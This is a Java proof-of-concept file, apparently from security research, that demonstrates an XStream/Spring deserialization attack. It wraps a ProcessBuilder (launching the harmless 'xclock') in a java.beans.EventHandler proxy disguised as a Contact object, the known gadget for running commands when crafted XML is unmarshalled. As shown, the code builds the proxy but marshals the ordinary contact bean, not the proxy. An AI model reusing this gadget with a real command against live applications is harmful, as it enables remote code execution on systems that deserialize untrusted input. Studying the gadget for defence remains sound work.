package org.pwntester.springbreaker;


import java.lang.reflect.Proxy;
import java.lang.ProcessBuilder;

import org.springframework.context.support.ClassPathXmlApplicationContext;

import java.io.IOException;
import java.io.FileOutputStream;
import javax.xml.transform.stream.StreamResult;

import org.springframework.oxm.Marshaller;
import org.springframework.oxm.Unmarshaller;

import java.beans.EventHandler;

import com.company.model.*;

public class EventHandlerXStreamExploit {
    private Marshaller marshaller;
    private Unmarshaller unmarshaller;

    public void setMarshaller(Marshaller marshaller) {
        this.marshaller = marshaller;
    }

    public void setUnmarshaller(Unmarshaller unmarshaller) {
        this.unmarshaller = unmarshaller;
    }

    public static void main(String[] args) throws IOException {
        ClassPathXmlApplicationContext appContext = new ClassPathXmlApplicationContext("xstream-exploit.xml");
        EventHandlerXStreamExploit application = (EventHandlerXStreamExploit) appContext.getBean("application");
        System.out.println("[+] Spring context initialized");

        // Marshall Object
        Contact contact = (Contact) appContext.getBean("contact");

        // Proxy
        ProcessBuilder pb = new java.lang.ProcessBuilder("xclock");
        EventHandler handler = new EventHandler(pb, "start", null, null); 
        Contact proxy = (Contact) Proxy.newProxyInstance(Contact.class.getClassLoader(), new Class<?>[] { Contact.class }, handler); 

        FileOutputStream os = null;
        try {
            os = new FileOutputStream("contact.xml");
            application.marshaller.marshal(contact, new StreamResult(os));
        } catch (Exception e) { 
            e.printStackTrace();
        } finally {
            if (os != null) {
                os.close();
            }
        }

        System.out.println("[+] Object marshalled");
    }
}